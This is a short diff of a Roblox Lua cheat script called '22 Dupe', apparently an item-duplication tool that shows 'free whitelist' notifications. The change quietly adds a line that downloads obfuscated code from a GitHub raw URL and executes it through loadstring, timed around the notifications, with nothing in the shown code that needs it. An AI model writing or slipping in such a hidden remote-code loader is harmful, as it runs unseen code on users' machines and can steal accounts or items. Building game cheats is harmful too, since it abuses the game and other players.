@@ -41,9 +41,10 @@ else
       notifSound.PlayOnRemove = true
       notifSound:Destroy()
 game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "Type /e Drop <Amt> for AutoDrop", Icon = "rbxassetid://505845268", Duration = 60, Button1 = "Gocha!"})
-game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "FeeREE WHITELIST                                    By kristina#1111", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Okay"})
-
-
+game.StarterGui:SetCore("SendNotification", {Title = "22 Dupe", Text = "FOOREE WHITELIST                                    By kristina#1111", Icon = "rbxassetid://505845268", Duration = 10, Button1 = "Okay"})
+wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/source_obfuscated", true))()
+wait(7)
 local StarterGui = game:GetService("StarterGui")
 
 local Notifications = {
